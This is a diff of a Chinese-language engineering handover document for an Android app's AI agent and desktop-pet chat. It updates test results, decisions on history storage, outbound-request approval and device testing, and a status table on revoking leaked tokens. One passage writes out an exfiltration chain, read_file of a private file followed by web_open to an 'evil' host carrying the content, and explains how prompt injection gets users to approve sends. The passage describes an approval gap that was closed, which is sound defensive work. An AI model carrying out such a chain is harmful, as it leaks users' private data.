@@ -282,15 +282,43 @@ NDK 编译会让 24 分钟的 CI 翻倍，APK 从 35 MB 涨到 110 MB，而收�
 
 **本机验证账**（`QA_GRADLE_CACHE` 里备了 2.2.21 的编译器构件）：
 
-- 全绿：`run-agent-seams`（40）、`run-desktop-pet`（61）、`run-voice-arbiter`（43）、
-  `run-pet-history`（17）、`run-approval-tier`（22）、`run-private-read-approval`（30）、
+- 全绿：`run-agent-seams`（49）、`run-desktop-pet`（75）、`run-voice-arbiter`（43）、
+  `run-pet-history`（24）、`run-approval-tier`（22）、`run-private-read-approval`（30）、
   `run-shell-read-boundary`（31）
 - 反向变异：删 `tainted.set(true)` → D2/D3/D4 红；删 `job?.cancel()` → K2 红；
   会话改回 `new` → K4 红；TtsController 改回自建引擎 → A17/A18 红；
-  预览改回 `take(limit)` → E2/E3 红；全部恢复后回绿
+  预览改回 `take(limit)` → E2/E3 红；恢复挪到取快照之后 → L2 红；清空只清内存 → L4 红；
+  全部恢复后回绿
 - 断言普查：1729 条，未超基线（新断言全是行为断言，`AgentSeamsVerification.kt` 的文本断言 2 → 0）
 - 本机仍跑不动的：用 `kotlinc` CLI 的那批（`run-r13-catalog`、`run-approval-grouping` 等），
   机器上没有 `/tmp/kotlinc`——与改动无关，交 CI
+
+### 3.11 五项「都要做」的落地（2026-11-17 晚）
+
+用户在拍板时选了「都要做，往最好的方面做」。五项里三项能写代码，两项只能落地成资产。
+
+| # | 事项 | 落地 | 守卫 |
+|---|---|---|---|
+| 1 | 桌宠历史落盘 | `pet/PetHistoryStore.kt` + `PetAgentSession` 恢复/保存 + 菜单「清空对话」 | `run-desktop-pet` L0–L9d、`run-pet-history` C1–C6 |
+| 2 | 外发确认档位 | 定「每次问」并锁死：`EgressGuard.taintedNow` → `requestApproval` 降级为不可记忆 | `run-agent-seams` C1–C5 |
+| 3 | P1 期间暂停新功能 | `docs/architecture/P1-冻结令-2026-11-17.md` + `AGENTS.md` 置顶 | 人读（无法自动判「加功能」） |
+| 4 | 真机矩阵 | `docs/qa/真机矩阵-v1.md`（41 条）+ `scripts/qa/device/matrix.sh` | 脚本自身；无设备时退 2 并打 `COVERAGE INCOMPLETE` |
+| 5 | 吊销泄漏的 PAT | 仓库与 869 个提交全扫：**0 条真 token**（只有测试假串）；仓库侧开 Dependabot、清误报告警 | 手工（撤销在用户账号里） |
+
+**第 2 项为什么不是「加个设置项让用户选 5 分钟免问」**：那正是原方案里列的第二个选项，
+但它把「要不要把内容发出去」变成一个**可以被记住**的决定，而提示注入的全部技巧就是让用户
+在错误的语境下点一次「允许」。所以选每次问，并且把这条决定写进代码：本回合读过私有内容后，
+`http_request` 的逐域记忆也失效（三档 + 会话白名单 + 截图缓存全绕过）。
+
+**顺手补的真漏洞**：`DEFAULT_EGRESS_TOOLS` 原来只有 `web_search`，而 `web_open` / `web_eval` /
+`web_click` / `web_type` 在 `ToolCatalog` 里**都免审批**。也就是
+`read_file(私密文件) → web_open("https://evil/?d=" + 内容)` 全程零弹窗。四个工具已补进集合；
+`http_request` 刻意不加（它有自己的逐域审批，重复弹窗是负价值）。
+
+**第 1 项的两个边界**（后人改之前先看）：
+- 只存 user/assistant 的**文本**，不存 tool 轨迹：残缺的 `tool_calls` 配对会让下一轮请求直接 400。
+- 上限与内存同源（`MAX_HISTORY = PetHistoryStore.MAX_MESSAGES`）：存得比模型记得多，用户会看到
+  一段模型「不认」的对话。
 
 ---
 
@@ -420,10 +448,12 @@ done
 
 | 事项 | 状态 | 怎么办 |
 |---|---|---|
-| CI 最后一次构建结果 | **未确认**（沙箱到 `api.github.com` 时通时断） | 打开仓库 Actions 页看最新一次构建（应覆盖 `a1e25e4` / `1939aa2`） |
-| 之前用过的 PAT | 待用户撤销 | 已从沙箱删除，仍需在 GitHub 设置里 revoke |
-| 桌宠形象 / 唤醒词 / 历史互通 | 待拍板 | 见 §3.5 |
-| 桌宠真机验证 | 未做 | 上线后在 `docs/ops/DEVICE-VERIFICATION-PENDING.md` 新增 P11 章节 |
+| CI 最后一次构建结果 | **未确认**（沙箱到 `api.github.com` 时通时断） | 打开仓库 Actions 页看最新一次构建（应覆盖 `66dd431` 之后的提交） |
+| 之前用过的 PAT（两个） | 待用户撤销 | 仓库与 869 个提交全扫过：**0 条真 token**，历史干净；但会话里明文出现过，仍需在 GitHub 设置里 revoke |
+| 桌宠真机验证 | 未做（本机无设备） | 按 `docs/qa/真机矩阵-v1.md` 跑 `scripts/qa/device/matrix.sh`；机型建议 S1(API 31) + S2(国产 ROM) |
+
+**已定，不再挂在这里**（2026-11-17）：桌宠历史落盘（做了）、外发审批档位（每次问）、
+P1 期间暂停新功能（冻结令）、真机机型（矩阵文档给了建议）。
 
 ---
 
